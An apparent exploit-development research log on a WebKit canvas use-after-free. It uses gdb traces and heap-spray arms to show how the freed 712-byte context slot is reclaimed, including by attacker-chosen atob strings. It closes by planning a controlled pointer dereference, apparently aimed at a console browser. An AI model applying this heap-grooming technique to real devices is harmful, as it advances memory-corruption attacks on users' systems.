# 112 — the canvas slot, measured from inside: `docs/103`'s negative was the page's own beacon

**Status:** measured 2026-10-30 on the local ASAN oracle, quarantine off, `max_malloc_fill_size=0`. The action
(`GOAL.md` item 1) asked for the *address* `docs/103` could not explain: does anything return the freed
712-byte `CanvasRenderingContext2D` chunk, and what. It does, and it is the harness: the `new Image()` beacon
that runs **inside the trigger's own statement** allocates a 720-byte `CachedImage` in the same ASAN size class,
and that object is memory-cached, so it holds the slot for the rest of the run while all 80 spray contexts land
elsewhere. Move that one beacon after the spray and the local oracle reproduces retail: `sentinel hit=0`,
6/6 runs, no sanitizer. A 692-character `atob` string takes the slot just as reliably, which is the attacker-byte
occupant `docs/65` had and canvas never did.

## 0. Method — the slot's address, from inside the process

Attaching after the trigger is too late, so `canvasfield.html` gained a gate (`gate=1`: poll `/gate.txt` until the
runner writes `go`) and gdb is given three hooks (`research/canvas-alias/slotwatch.py`, Python, because `finish`
inside a breakpoint command list truncates the rest of the list on this gdb):

* `WebCore::CanvasRenderingContext::~CanvasRenderingContext()` — the first base, so `$rdi` is the object base and
  the out-of-line dtor always resolves (`CanvasRenderingContext2D::operator delete(void*)` does not: gdb reports
  "Function not defined" and the breakpoint stays pending);
* `WTF::fastFree` filtered to `$rdi == A` — ties the dtor to the allocator, and its stack is `docs/103`'s;
* from the free's *return*, a `fastMalloc` tracer for every request in A's size class (700..768, each with its
  return value) plus a hardware write watchpoint on A that reports the first write after the free with its
  backtrace — the allocation that really owns the slot.

Page md5 `08bfde9edc37a3e20130049fb7129d3a`. Every arm below differs from its neighbour in exactly one query
knob. Logs: `data/canvas-slot/gdb_*.log` (full gdb), `data/canvas-slot/run_*.txt` (page runs).

```
bash research/canvas-alias/slotgdb.sh g_early_alloc 11104 'arm=spray&n=80&gate=1' 160
bash research/canvas-alias/slotgdb.sh g_late_alloc  11105 'arm=spray&n=80&gate=1&btrig=late' 160
bash research/canvas-alias/slotgdb.sh g_str_alloc   11106 'arm=str&n=80&gate=1&btrig=late' 160
bash research/canvas-alias/slotgdb.sh g_nospray_late 11100 'arm=nospray&gate=1&btrig=late' 160
bash research/canvas-alias/slotgdb.sh g_sb          11113 'arm=spray&n=80&gate=1&bkind=sb' 160
```

## 1. The free is real and is `docs/103`'s (reconfirmed with the address)

```
CTXDTOR A=0x617000011c00
#0 WebCore::CanvasRenderingContext::~CanvasRenderingContext()
#1 WebCore::CanvasRenderingContext2DBase::~CanvasRenderingContext2DBase()
#2 WebCore::CanvasRenderingContext2D::~CanvasRenderingContext2D()
#3 WebCore::CanvasRenderingContext2D::~CanvasRenderingContext2D()
#4 WebCore::HTMLCanvasElement::createContextBitmapRenderer(...)
#5 WebCore::HTMLCanvasElement::getContext(JSC::JSGlobalObject&, ...)
FREED-A ptr=0x617000011c00
#0 WTF::fastFree (p=0x617000011c00) at Source/WTF/wtf/FastMalloc.cpp:266
#1 WebCore::CanvasRenderingContext2D::~CanvasRenderingContext2D()
```

`CanvasRenderingContext` is a `ScriptWrappable` with `ref()/deref()` that ref the **canvas**, not the context
(`CanvasRenderingContext.cpp:80-88`), and the context is owned by `HTMLCanvasElement::m_context`
(`std::unique_ptr`): so replacing it at `HTMLCanvasElement.cpp:484` really does destroy the object the inner
`getContext('2d')` returned, while the JS wrapper keeps the raw pointer. Nothing in this run changes that.

## 2. The exact `docs/103` arm: the beacon takes the slot, the spray never does

`arm=spray&n=80` (beacon where `docs/103` had it — `B('trig')` on the line after `getContext` returns):

```
FREED-A ptr=0x617000011c00
WATCH installed on 0x617000011c00
ALLOC req=720 ret=0x617000011c00 n=1  <== A
#0 WebCore::createResource(WebCore::CachedResource::Type, WebCore::CachedResourceRequest&&, ...)
#1 WebCore::CachedResourceLoader::loadResource(...)
#2 WebCore::CachedResourceLoader::requestResource(..., WebCore::ImageLoading)
#3 WebCore::CachedResourceLoader::requestImage(...)
#4 WebCore::ImageLoader::updateFromElement(WebCore::RelevantMutation)
#5 WebCore::ImageLoader::updateFromElementIgnoringPreviousError(...)
#6 WebCore::HTMLImageElement::selectImageSource(WebCore::RelevantMutation)
#7 WebCore::HTMLImageElement::attributeChanged(...)
WROTE-A addr=0x617000011c00 val=0x7f45f4b4bd90
#0 WebCore::CachedResource::CachedResource(...)
#1 WebCore::CachedImage::CachedImage(...)
#2 WebCore::createResource(...)
ALLOC req=744 ret=0x617000011f80 n=2
ALLOC req=712 ret=0x617000011f80 n=3
ALLOC req=712 ret=0x617000012300 n=4
ALLOC req=712 ret=0x617000012680 n=5
...                                   (80 × req=712, addresses 12300, 12680, 12a00, …)
```

Read in order: the first allocation after the free is a **720-byte `CachedImage`**, built by the beacon's own
`new Image()` → `ImageLoader::updateFromElement`, and it **returns A** (request 720 is in the same ASAN size
class as 712). Its first word — the `CachedResource` vtable, `val=0x7f45f4b4bd90` — is written into A at offset
0. Every one of the 80 `CanvasRenderingContext2D` allocations (all `req=712`) then gets a *different* chunk — no
later line in the ladder carries `<== A`. The page dies at its first use of the stale wrapper, before any `sent`
beacon: 4/4 runs of this arm (11121-11123 with this page, `cf_spray80b` with the pre-gate page).

That is `docs/103`'s table explained: every arm in it emitted that beacon before spraying, so the slot was
already owned by a live `CachedImage` when the spray started. `docs/103` recorded the consequence (first use
dies) and read it as "the alias does not reproduce on this build". The alias does reproduce; the window had a
thief in it.

Also note what the thief is *not*: it is not a stale reference to something the page dropped. It is a normal
memory-cached image resource for the beacon URL, alive for the whole run — which is why the slot never comes back.

## 3. The positive control: move that one beacon after the spray

`btrig=late` emits exactly the same `B('trig', …)` one statement later, after the 80 contexts:

```
FREED-A ptr=0x617000021800
ALLOC req=744 ret=0x617000021800 n=1  <== A
WROTE-A addr=0x617000021800 val=0x0
#0 WTF::VectorBufferBase<unsigned char, WTF::FastMalloc>::VectorBufferBase(this=0x617000021800)
#1 WTF::VectorBuffer<unsigned char, 0ul, WTF::FastMalloc>::VectorBuffer
#2 WTF::Vector<unsigned char, 0ul, ...>::Vector
#3 JSC::InstructionStream<...>::InstructionStream(this=0x617000021800)
#5 JSC::BytecodeGeneratorBase<JSC::JSGeneratorTraits>::BytecodeGeneratorBase(this=0x617000021800, ...)
#6 JSC::BytecodeGenerator::BytecodeGenerator(this=0x617000021800, ...)
ALLOC req=712 ret=0x617000021800 n=2  <== A
#0 WebCore::CanvasRenderingContext2D::create(WebCore::CanvasBase&, WebCore::CanvasRenderingContext2DSettings&&, bool)
#1 WebCore::HTMLCanvasElement::createContext2d(WTF::String const&, WebCore::CanvasRenderingContext2DSettings&&)
#2 WebCore::HTMLCanvasElement::getContext(JSC::JSGlobalObject&, WTF::String const&, ...)
#3 WebCore::jsHTMLCanvasElementPrototypeFunction_getContext(...)
ALLOC req=712 ret=0x617000021b80 n=3
...
```

and the page, 6/6 runs (11101-11103, 11131-11133; identical gdb run 11105):

```
trig&inner=2d&outerkind=bmr&stale=1&outer=1&late=1
sprayed&n=80&arm=spray
sent&tag=stale&hit=0&e=777.25&f=0&sprayed=80
stack&ok=0&e=777.25&sprayed=80
overrestore&n=64&err=-
done&arm=spray
  access: none
```

`sent hit=0` is the alias: the stale wrapper reads transform `e=777.25`, which is `translate(777.25 + 0, 0)` as
issued on `spray[0]`, and `REVERSE` (`stack ok=0`, the same value read again) confirms the two handles are one
object. The first occupant in this arm is JSC's transient `BytecodeGenerator` (744 bytes); it must have been freed
before `n=2`, because the allocator handed A back to the first *context* there. So the slot is not merely freeable — it is
recycled twice inside the same window, which is the strongest form of the observation.

## 4. The cross-type arm — `docs/108`'s discriminator, run where the console cannot run it

`arm=str&n=80&btrig=late`: eighty 692-character `atob` strings (StringImpl = 20-byte header + 692 = 712 bytes),
same count, same position, different class:

```
WROTE-A addr=0x617000021800 val=0x2
#0 WTF::StringImplShape::StringImplShape(hashAndFlags=4, data8=0x617000021814, length=692, refCount=2, this=0x617000021800)
ALLOC req=712 ret=0x617000021800 n=1  <== A
#0 WTF::FastMalloc::malloc
#1 WTF::StringImpl::createUninitializedInternalNonEmpty<unsigned char>(length=692)  StringImpl.cpp:189
#2 WTF::StringImpl::createInternal<unsigned char>(length=692, characters=0x619000066880 'A' …)
#3 WTF::StringImpl::create(...)
#4 WTF::String::String(...)
#5 WebCore::Base64Utilities::atob(WTF::String const&)
```

The first 712-byte request after the free is the string and it takes A; the page then dies at the first use
(2/2 page runs, `CanvasBase.h:97 scriptExecutionContext`; under gdb `enabledCanvasAgent`, i.e. whichever field
is read first). So: **same size, different class, same slot** — a plain free list, no type segregation, exactly
as `docs/111` said. And `docs/108`'s discriminator is now answered in the one place it can be: on the console a
cross-type 712-byte allocation would have to *not* take a freed canvas slot for IsoHeap to be present, and here
it does.

## 5. The no-spray control

`arm=nospray&btrig=late` (no allocation between the free and the use): the first write is again JSC's
`BytecodeGenerator` (744, `val=0x0`, `VectorBufferBase` at A), and at the fault A still holds an object whose
first word is a library vtable:

```
SLOT A=0x617000021800
0x617000021800:  0x00007fd5d7c7cbd8  0x0000602000029050
0x617000021810:  0x0000070000020206  0x0000000000000000
FAULT si_addr=$1 = 0x8
#0 WebCore::CanvasRenderingContext2DBase::setFillColor(WTF::String const&, std::optional<float>)
```

so it is not a freed-and-left chunk that gets read: the slot is *owned* by something whose fields are not a
context's, and `setFillColor` faults on the first String it reads (1/1 page run 11143, 1/1 gdb 11100). A spray
is therefore required for the alias, and a same-class allocation that does not survive as a context is not one.
That is the control the alias needs and `docs/103` never had.

## 6. The beacon's transport does not save the window — `sendBeacon` swaps the thief, not the theft

`bkind=sb` sends the same beacons through `navigator.sendBeacon` (retail's `c043b` transport). No `CachedImage`
is created — and the slot is taken anyway:

```
ALLOC req=704 ret=0x617000021800 n=1  <== A
#0 WebCore::createResource(...)
#1 WebCore::CachedRawResource::CachedRawResource(...)
#2 WebCore::createResource(...)
#3 WebCore::CachedResourceLoader::loadResource(...)
#4 WebCore::CachedResourceLoader::requestResource(...)
#5 WebCore::CachedResourceLoader::requestBeaconResource(WebCore::CachedResourceRequest&&)
#6 WebCore::NavigatorBeacon::sendBeacon(WebCore::Document&, WTF::String const&, ...)
```

`CachedRawResource` is 704 bytes and A is still the newest chunk in its class, so it takes the slot just the
same. This arm is **not scorable**: the `sendBeacon` requests never reached the python server (0 `GET`/`POST
/ev` lines in two page runs, 11111/11112), so its beacons are lost and the page's own score is unavailable. It
is recorded because it changes the reading of `docs/108`'s console result: on the console the *same* sendBeacon
shape produced `alias=2`, so what differs between retail and this oracle is the allocator's class geometry (and
possibly the Guide app's beacon path), **not** whether a beacon was used.

## 7. Corrections

* **`docs/103` §1 has a cause, and it is the harness.** The `new Image()` beacon that runs one statement after
  `getContext` allocates a 720-byte `CachedImage` in the freed chunk's size class and keeps it (memory cache).
  Every "spray" arm in that doc therefore tested a slot that was already occupied. The local build was never the
  reason the alias failed.
* **712 is not a size class.** Measured in one run: requests 704 (`CachedRawResource`), 712
  (`CanvasRenderingContext2D`, `StringImpl`), 720 (`CachedImage`) and 744 (`JSC::BytecodeGenerator`) all returned
  the *same* slot in different runs. `docs/103` said this for the Gigacage path; it is now measured for
  `fastMalloc` too, and it is why the 80 × "712" spray must be compared by address, not by size.
* **`docs/108`'s correction is too strong where it says the local build cannot judge occupation at all.** With
  no same-class allocation in the window the local oracle reclaims the slot deterministically (6/6 `hit=0`), so
  same-type occupation *is* locally reproducible; what the local build cannot emulate is bmalloc's geometry and
  the console's beacon path. "The console is the only oracle for occupation, for every class" should read: the
  console is the only oracle for *class geometry*; the local build is an oracle for *ordering and liveness*.
* **`docs/103`'s crash site is a property of the occupant, not of the bug.** The same arm dies in
  `CanvasBase::scriptExecutionContext()` in `docs/103`, in `CanvasRenderingContext2DBase::setFillColor →
  parseColor → RawPtrTraits<StringImpl>::unwrap` today with the boot beacon added, and at
  `enabledCanvasAgent` in the string arm. All three are the first field read of whatever sits at A; only the
  address evidence says who that is.

## 8. What this does not claim

No console claim of any kind. The `sendBeacon` arm produced no score and is not evidence about 14.10. The alias
itself is field control of a *live* `CanvasRenderingContext2D` (docs/108's limitation stands): the occupant is a
real context the engine initialised, so no attacker byte is in the slot when the alias works. The string
occupant is attacker bytes, but it dies before returning anything to JS — that is the next question, not a
result.

## 9. Next

The 692-byte `atob` string is a *persistent* occupant whose every byte we choose, which is exactly what
`docs/65`'s `CSSFontFace` had and the canvas slot never did. Next: with the string occupying A
(`arm=str&n=80&btrig=late`), place a chosen 8-byte value at the offset the engine reads as `m_canvas`
(`CanvasRenderingContext::m_canvas` is a `CanvasBase&`, i.e. one pointer) and read the fault address against it,
with an offset-shifted control in the same container — a controlled-pointer dereference scored from the ASAN
report, the canvas analogue of `docs/65` "Attempt 5". One variable: the 8 bytes at that offset.
